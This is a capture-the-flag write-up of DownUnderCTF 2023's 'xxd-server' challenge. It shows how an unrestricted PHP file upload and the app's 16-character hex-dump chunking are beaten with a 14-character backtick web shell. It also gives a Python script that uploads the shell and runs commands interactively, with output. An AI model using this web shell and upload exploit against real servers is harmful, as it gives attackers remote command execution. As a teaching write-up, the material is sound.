# xxd-server

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @Foo
- Contributor: @siunam
- 360 solves / 100 points
- Author: hashkitten
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

I wrote a little app that allows you to hex dump files over the internet.

Author: hashkitten

[https://web-xxd-server-2680de9c070f.2023.ductf.dev](https://web-xxd-server-2680de9c070f.2023.ductf.dev)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903192441.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903192509.png)

**In here, we can upload a file:**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/xxd-server)-[2023.09.03|19:25:50(HKT)]
└> echo -n 'test' > test.txt
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903192644.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903193051.png)

When we clicked the "Upload" button, it'll send a POST request to `/`, with form data parameter `file-upload`, `filename`, and the file's content.

**After uploaded, we can view the uploaded file in `/uploads/<random_hex>/<filename>`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903192834.png)

As expected, the uploaded file is the result of the `xxd` program, which allows you to view the binary data of a file.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/web/xxd-server/xxd_server.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/xxd-server)-[2023.09.03|19:27:26(HKT)]
└> file xxd_server.zip        
xxd_server.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/xxd-server)-[2023.09.03|19:27:27(HKT)]
└> unzip xxd_server.zip        
Archive:  xxd_server.zip
  inflating: .htaccess               
  inflating: Dockerfile              
  inflating: index.php               
```

**`index.php`:**
```php
<?php

// Emulate the behavior of command line 'xxd' tool
function xxd(string $s): string {
    $out = '';
    $ctr = 0;
    foreach (str_split($s, 16) as $v) {
        $hex_string = implode(' ', str_split(bin2hex($v), 4));
        $ascii_string = '';
        foreach (str_split($v) as $c) {
            $ascii_string .= $c < ' ' || $c > '~' ? '.' : $c;
        }
        $out .= sprintf("%08x: %-40s %-16s\n", $ctr, $hex_string, $ascii_string);
        $ctr += 16;
    }
    return $out;
}

$message = '';

// Is there an upload?
if (isset($_FILES['file-upload'])) {
    $upload_dir = 'uploads/' . bin2hex(random_bytes(8));
    $upload_path = $upload_dir . '/' . basename($_FILES['file-upload']['name']);
    mkdir($upload_dir);
    $upload_contents = xxd(file_get_contents($_FILES['file-upload']['tmp_name']));
    if (file_put_contents($upload_path, $upload_contents)) {
        $message = 'Your file has been uploaded. Click <a href="' . htmlspecialchars($upload_path) . '">here</a> to view';
    } else {
        $message = 'File upload failed.';
    }
}

?>
<!DOCTYPE html>
<html>
[...]
<body>
    <div class="container">
        <h1>xxd-server</h1>
        <p>Our patented hex technology&trade; allows you to view the binary data of any file. Try it here!</p>
        <form action="/" method="POST" enctype="multipart/form-data">
            <input type="file" id="file-upload" name="file-upload">
            <label for="file-upload">Select File</label>
            <br>
            <input type="submit" id="submit-button" value="Upload">
        </form>
        <?= $message ? '<p>' . $message . '</p>' : ''; ?>
    </div>
</body>
</html>
```

When we uploaded a file, it'll call function `xxd()`.

In that function, it's emulating the behavior of command line `xxd` tool.

It's worth noting that the file's content will be splitted into **16 characters chunk**:

```php
    [...]
    foreach (str_split($s, 16) as $v) {
        $hex_string = implode(' ', str_split(bin2hex($v), 4));
        $ascii_string = '';
        foreach (str_split($v) as $c) {
            $ascii_string .= $c < ' ' || $c > '~' ? '.' : $c;
        }
        $out .= sprintf("%08x: %-40s %-16s\n", $ctr, $hex_string, $ascii_string);
        $ctr += 16;
    }
    [...]
```

**`.htaccess`:**
```
# Everything not a PHP file, should be served as text/plain
<FilesMatch "\.(?!(php)$)([^.]*)$">
    ForceType text/plain
</FilesMatch>
```

As you can see, **when the file has the `.php` extension, it'll run the file's PHP code.**

## Exploitation

That being said, we should be able to **upload arbitrary PHP files**, as the application doesn't validate which file extension we're not allow to upload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903194643.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903194656.png)

Nice! We should now able to read the flag file!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903194741.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2023/images/Pasted%20image%2020230903194753.png)

Wait... What?? Why it's empty?

**I mean... We can test it locally:**
```php
<?php
function xxd(string $s): string {
    $out = '';
    $ctr = 0;
    foreach (str_split($s, 16) as $v) {
        $hex_string = implode(' ', str_split(bin2hex($v), 4));
        $ascii_string = '';
        foreach (str_split($v) as $c) {
            $ascii_string .= $c < ' ' || $c > '~' ? '.' : $c;
        }
        $out .= sprintf("%08x: %-40s %-16s\n", $ctr, $hex_string, $ascii_string);
        $ctr += 16;
    }
    return $out;
}

$output = xxd('<?php system("cat /flag") ?>');
echo $output;
?>
```

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/xxd-server)-[2023.09.03|19:50:16(HKT)]
└> php xxd.php
00000000: 3c3f 7068 7020 7379 7374 656d 2822 6361  <?php system("ca
00000010: 7420 2f66 6c61 6722 2920 3f3e            t /flag") ?>    
```

Oh! Do you remember the **16 characters chunk**? In here, we can see that **when the payload is greater than 16 characters**, function `xxd()` will split the payload with a newline character.

**Armed with above information, the payload must be less than 16 characters:**
```php
$payload = '<?=`$_GET[1]`;';
$output = xxd($payload);
echo "[+] xdd result:\n$output";
echo '[+] Payload length: ' . strlen($payload);
```

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/xxd-server)-[2023.09.03|19:56:30(HKT)]
└> php xxd.php
[+] xdd result:
00000000: 3c3f 3d60 245f 4745 545b 315d 3b60       <?=`$_GET[1]`;  
[+] Payload length: 14
```

**This payload is:**
- `<?=` - a PHP short `echo` tag, which is a short-hand to the more verbose `<?php echo`
- Backticks - the execution operators, which executes OS command and it's identical to [shell_exec()](https://www.php.net/manual/en/function.shell-exec.php)
- `$_GET[1]` - when GET parameter `1` is provided, it'll execute the command based on the value

**To automate stuff, I'll write a Python script:**
```python
#!/usr/bin/env python3
import requests
import io
from bs4 import BeautifulSoup

class Solver:
    def __init__(self, BASE_URL):
        self.BASE_URL = BASE_URL

    def uploadFile(self, files):
        fileUploadResponse = requests.post(self.BASE_URL, files=files)

        if fileUploadResponse.status_code != 200:
            print('[-] Fail to upload the file...')
            return

        soup = BeautifulSoup(fileUploadResponse.text, 'html.parser')
        uploadedFilePath = soup.a['href']

        print(f'[+] File uploaded! Path: /{uploadedFilePath}')
        return uploadedFilePath

    def readUploadedFile(self, uploadedFilePath, command):
        fullUploadedFilePath = self.BASE_URL + uploadedFilePath + f'?1={command}'
        uploadedFileResponse = requests.get(fullUploadedFilePath)
        
        if uploadedFileResponse.status_code != 200:
            print('[-] Failed to execute OS command...')
            return

        print(f'[+] Command executed!! Response:\n{uploadedFileResponse.text.strip()}')

if __name__ == '__main__':
    BASE_URL = 'https://web-xxd-server-2680de9c070f.2023.ductf.dev/'
    solver = Solver(BASE_URL)

    phpFilename = 'payload.php'
    phpPayload = '<?=`$_GET[1]`;'
    phpFileObject = io.BytesIO(phpPayload.encode())
    files = {
        'file-upload': ('payload.php', phpFileObject)
    }
    uploadedFilePath = solver.uploadFile(files)

    try:
        print('[*] Execute OS command in here... Type "exit" to quit:')
        while True:
            command = input('> ')
            if command == 'exit':
                print('[*] Bye!')
                break

            solver.readUploadedFile(uploadedFilePath, command)
    except KeyboardInterrupt:
        print('\n[*] Bye!')
```

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2023/web/xxd-server)-[2023.09.03|20:24:10(HKT)]
└> python3 solve.py
[+] File uploaded! Path: /uploads/317317414ddf9917/payload.php
[*] Execute OS command in here... Type "exit" to quit:
> ls -lah /
[+] Command executed!! Response:
00000000: 3c3f 3d60 245f 4745 545b 315d 603b       total 68K
drwxr-xr-x   1 root root 4.0K Sep  3 09:43 .
drwxr-xr-x   1 root root 4.0K Sep  3 09:43 ..
lrwxrwxrwx   1 root root    7 Aug 14 00:00 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Jul 14 16:00 boot
drwxr-xr-x   5 root root  360 Sep  3 09:43 dev
drwxr-xr-x   1 root root 4.0K Sep  3 09:43 etc
-rw-r--r--   1 root root   74 Aug 31 02:13 flag
drwxr-xr-x   2 root root 4.0K Jul 14 16:00 home
lrwxrwxrwx   1 root root    7 Aug 14 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Aug 14 00:00 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Aug 14 00:00 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Aug 14 00:00 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4.0K Aug 14 00:00 media
drwxr-xr-x   2 root root 4.0K Aug 14 00:00 mnt
drwxr-xr-x   2 root root 4.0K Aug 14 00:00 opt
dr-xr-xr-x 460 root root    0 Sep  3 09:43 proc
drwx------   1 root root 4.0K Aug 16 03:42 root
drwxr-xr-x   1 root root 4.0K Aug 16 02:16 run
lrwxrwxrwx   1 root root    8 Aug 14 00:00 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Aug 14 00:00 srv
dr-xr-xr-x  13 root root    0 Sep  3 09:42 sys
drwxrwxrwt   1 root root 4.0K Sep  3 12:24 tmp
drwxr-xr-x   1 root root 4.0K Aug 14 00:00 usr
drwxr-xr-x   1 root root 4.0K Aug 30 04:21 var
> cat /flag
[+] Command executed!! Response:
00000000: 3c3f 3d60 245f 4745 545b 315d 603b       DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}
> ^C
[*] Bye!
```

- **Flag: `DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}`**

## Conclusion

What we've learned:

1. Exploiting file upload vulnerability with 16 characters chunk